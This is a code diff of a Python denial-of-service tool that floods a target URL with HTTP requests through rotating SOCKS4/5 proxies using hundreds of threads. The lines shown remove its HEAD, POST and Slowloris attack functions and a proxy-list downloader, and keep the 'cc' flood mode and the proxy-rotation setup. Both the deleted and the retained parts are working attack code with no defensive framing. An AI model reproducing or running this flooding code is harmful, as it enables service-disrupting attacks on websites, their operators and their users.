@@ -60,24 +60,14 @@ Intn = random.randint
 Choice = random.choice
 ###################################################
 def build_threads(mode,thread_num,event,socks_type,ind_rlock):
-	if mode == "post":
-		for _ in range(thread_num):
-			th = threading.Thread(target = post,args=(event,socks_type,ind_rlock,))
-			th.setDaemon(True)
-			th.start()
-	elif mode == "cc":
+	if mode == "cc":
 		for _ in range(thread_num):
 			th = threading.Thread(target = cc,args=(event,socks_type,ind_rlock,))
 			th.setDaemon(True)
 			th.start()
-	elif mode == "head":
-		for _ in range(thread_num):
-			th = threading.Thread(target = head,args=(event,socks_type,ind_rlock,))
-			th.setDaemon(True)
-			th.start()
 
 def getuseragent():
-	platform = Choice(['Macintosh', 'Windows', 'X11'])
+	platform = Choice(['Macintosh', 'Windows', 'X11']) #radom
 	if platform == 'Macintosh':
 		os  = Choice(['68K', 'PPC', 'Intel Mac OS X'])
 	elif platform == 'Windows':
@@ -303,152 +293,7 @@ def cc(event,socks_type,ind_rlock):
 		except:
 			s.close()
 
-def head(event,socks_type,ind_rlock):#HEAD MODE
-	global ind_dict
-	header = GenReqHeader("head")
-	proxy = Choice(proxies).strip().split(":")
-	add = "?"
-	if "?" in path:
-		add = "&"
-	event.wait()
-	while True:
-		try:
-			s = socks.socksocket()
-			if socks_type == 4:
-				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
-			if socks_type == 5:
-				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-			if brute:
-				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-			s.connect((str(target), int(port)))
-			if protocol == "https":
-				ctx = ssl.SSLContext()
-				s = ctx.wrap_socket(s,server_hostname=target)
-			try:
-				for n in range(multiple+1):
-					head_host = "HEAD " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
-					request = head_host + header
-					sent = s.send(str.encode(request))
-					if not sent:
-						ind_rlock.acquire()
-						ind_dict[(proxy[0]+":"+proxy[1]).strip()] += n
-						ind_rlock.release()
-						proxy = Choice(proxies).strip().split(":")
-						break#   This part will jump to dirty fix
-				s.close()
-			except:
-				s.close()
-			ind_rlock.acquire()
-			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += multiple+1
-			ind_rlock.release()
-		except:#dirty fix
-			s.close()
-
-def post(event,socks_type,ind_rlock):
-	global ind_dict
-	request = GenReqHeader("post")
-	proxy = Choice(proxies).strip().split(":")
-	event.wait()
-	while True:
-		try:
-			s = socks.socksocket()
-			if socks_type == 4:
-				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
-			if socks_type == 5:
-				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-			if brute:
-				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-			s.connect((str(target), int(port)))
-			if protocol == "https":
-				ctx = ssl.SSLContext()
-				s = ctx.wrap_socket(s,server_hostname=target)
-			try:
-				for n in range(multiple+1):
-					sent = s.send(str.encode(request))
-					if not sent:
-						ind_rlock.acquire()
-						ind_dict[(proxy[0]+":"+proxy[1]).strip()] += n
-						ind_rlock.release()
-						proxy = Choice(proxies).strip().split(":")
-						break
-				s.close()
-			except:
-				s.close()
-			ind_rlock.acquire()
-			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += multiple+1
-			ind_rlock.release()
-		except:
-			s.close()
-
-socket_list=[]
-def slow(conn,socks_type):
-	proxy = Choice(proxies).strip().split(":")
-	for _ in range(conn):
-		try:
-			s = socks.socksocket()
-			if socks_type == 4:
-				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
-			if socks_type == 5:
-				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-			s.settimeout(1)
-			s.connect((str(target), int(port)))
-			if str(port) == '443':
-				ctx = ssl.SSLContext()
-				s = ctx.wrap_socket(s,server_hostname=target)
-			s.send("GET /?{} HTTP/1.1\r\n".format(Intn(0, 2000)).encode("utf-8"))# Slowloris format header
-			s.send("User-Agent: {}\r\n".format(getuseragent()).encode("utf-8"))
-			s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
-			if cookies != "":
-				s.send(("Cookies: "+str(cookies)+"\r\n").encode("utf-8"))
-			s.send(("Connection:keep-alive").encode("utf-8"))
-			
-			socket_list.append(s)
-			sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
-			sys.stdout.flush()
-		except:
-			s.close()
-			proxy = Choice(proxies).strip().split(":")#Only change proxy when error, increase the performance
-			sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
-			sys.stdout.flush()
-	while True:
-		for s in list(socket_list):
-			try:
-				s.send("X-a: {}\r\n".format(Intn(1, 5000)).encode("utf-8"))
-				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
-				sys.stdout.flush()
-			except:
-				s.close()
-				socket_list.remove(s)
-				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
-				sys.stdout.flush()
-		proxy = Choice(proxies).strip().split(":")
-		for _ in range(conn - len(socket_list)):
-			try:
-				if socks_type == 4:
-					s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
-				if socks_type == 5:
-					s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-				s.settimeout(1)
-				s.connect((str(target), int(port)))
-				if int(port) == 443:
-					ctx = ssl.SSLContext()
-					s = ctx.wrap_socket(s,server_hostname=target)
-				s.send("GET /?{} HTTP/1.1\r\n".format(Intn(0, 2000)).encode("utf-8"))# Slowloris format header
-				s.send("User-Agent: {}\r\n".format(getuseragent).encode("utf-8"))
-				s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
-				if cookies != "":
-					s.send(("Cookies: "+str(cookies)+"\r\n").encode("utf-8"))
-				s.send(("Connection:keep-alive").encode("utf-8"))
-				socket_list.append(s)
-				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
-				sys.stdout.flush()
-			except:
-				proxy = Choice(proxies).strip().split(":")
-				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
-				sys.stdout.flush()
-				pass
-nums = 0
-def checking(lines,socks_type,ms,rlock,):#Proxy checker coded by Leeon123
+def checking(lines,socks_type,ms,rlock,):
 	global nums
 	global proxies
 	proxy = lines.strip().split(":")
@@ -484,7 +329,7 @@ def checking(lines,socks_type,ms,rlock,):#Proxy checker coded by Leeon123
 			err +=1
 	nums += 1
 
-def check_socks(ms):#Coded by Leeon123
+def check_socks(ms):
 	global nums
 	thread_list=[]
 	rlock = threading.RLock()
@@ -532,78 +377,6 @@ def check_list(socks_file):
 		rfile.write(bytes(i,encoding='utf-8'))
 	rfile.close()
 
-def downloadsocks(choice):
-	if choice == "4":
-		f = open("socks4.txt",'wb')
-		try:
-			r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",timeout=5)
-			f.write(r.content)
-		except:
-			pass
-		try:
-			r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4",timeout=5)
-			f.write(r.content)
-		except:
-			pass
-		try:
-			r = requests.get("https://www.proxyscan.io/download?type=socks4",timeout=5)
-			f.write(r.content)
-		except:
-			pass
-		try:
-			r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",timeout=5)
-			f.write(r.content)
-			f.close()
-		except:
-			f.close()
-		try:#credit to All3xJ
-			r = requests.get("https://www.socks-proxy.net/",timeout=5)
-			part = str(r.content)
-			part = part.split("<tbody>")
-			part = part[1].split("</tbody>")
-			part = part[0].split("<tr><td>")
-			proxies = ""
-			for proxy in part:
-				proxy = proxy.split("</td><td>")
-				try:
-					proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
-				except:
-					pass
-				out_file = open("socks4.txt","a")
-				out_file.write(proxies)
-				out_file.close()
-		except:
-			pass
-		print("	[+] Have already downloaded socks4 list as socks4.txt")
-	if choice == "5":
-		f = open("socks5.txt",'wb')
-		try:
-			r = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",timeout=5)
-			f.write(r.content)
-		except:
-			pass
-		try:
-			r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5",timeout=5)
-			f.write(r.content)
-		except:
-			pass
-		try:
-			r = requests.get("https://www.proxyscan.io/download?type=socks5",timeout=5)
-			f.write(r.content)
-		except:
-			pass
-		try:
-			r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",timeout=5)
-			f.write(r.content)
-		except:
-			pass
-		try:
-			r = requests.get("https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",timeout=5)
-			f.write(r.content)
-			f.close()
-		except:
-			f.close()
-		print("	[+] Have already downloaded socks5 list as socks5.txt")
 def prevent():
 	if '.gov' in url :
 		print("	[+] You can't attack .gov website!")
@@ -621,11 +394,6 @@ def main():
 	url = str(input("	[+] URL:")).strip()
 	prevent()
 	ParseUrl(url)
-	if mode == "post":
-		mode2 = InputOption("	[+] Customize post data? (y/n, default=n):",["y","n","yes","no"],"n")
-		if mode2 == "y":
-			data = open(str(input("> Input the file's path:")).strip(),"r",encoding="utf-8", errors='ignore').readlines()
-			data = ' '.join([str(txt) for txt in data])
 	choice2 = InputOption("	[+] Customize cookies? (y/n, default=n):",["y","n","yes","no"],"n")
 	if choice2 == "y":
 		cookies = str(input("Plese input the cookies:")).strip()
@@ -634,14 +402,7 @@ def main():
 		socks_type = 4
 	else:
 		socks_type = 5
-	if mode == "check":
-		CheckerOption()
-		print("	[+] End of process")
-		return
-	if mode == "slow":	
-		thread_num = str(input("	[+] Connections(default=400):"))
-	else:
-		thread_num = str(input("	[+] Threads(default=400):"))
+	thread_num = str(input("	[+] Threads(default=400):"))
 	if thread_num == "":
 		thread_num = int(400)
 	else:
@@ -654,34 +415,28 @@ def main():
 		print("	[+] There are no more proxies. Please download a new one.")
 		return
 	ind_rlock = threading.RLock()
-	if mode == "slow":
-		input("	[+] Press Enter to continue.")
-		th = threading.Thread(target=slow,args=(thread_num,socks_type,))
-		th.setDaemon(True)
-		th.start()
+	# multiple = str(input("	[+] Input the Magnification(default=100):"))
+	multiple = "100"
+	if multiple == "":
+		multiple = int(100)
 	else:
-		# multiple = str(input("	[+] Input the Magnification(default=100):"))
-		multiple = "100"
-		if multiple == "":
-			multiple = int(100)
-		else:
-			multiple = int(multiple)
-		# brute = str(input("	[+] Enable boost mode[beta](y/n, default=n):"))
-		brute = "n"
-		if brute == "":
-			brute = False
-		elif brute == "y":
-			brute = True
-		elif brute == "n":
-			brute = False
-		event = threading.Event()
-		print("	[+] Building threads...")
-		SetupIndDict()
-		build_threads(mode,thread_num,event,socks_type,ind_rlock)
-		event.clear()
-		input("	[+] Press Enter to continue.")
-		event.set()
-		threading.Thread(target=OutputToScreen,args=(ind_rlock,),daemon=True).start()
+		multiple = int(multiple)
+	# brute = str(input("	[+] Enable boost mode[beta](y/n, default=n):"))
+	brute = "n"
+	if brute == "":
+		brute = False
+	elif brute == "y":
+		brute = True
+	elif brute == "n":
+		brute = False
+	event = threading.Event()
+	print("	[+] Building threads...")
+	SetupIndDict()
+	build_threads(mode,thread_num,event,socks_type,ind_rlock)
+	event.clear()
+	input("	[+] Press Enter to continue.")
+	event.set()
+	threading.Thread(target=OutputToScreen,args=(ind_rlock,),daemon=True).start()
 	while True:
 		try:
 			time.sleep(0.1)
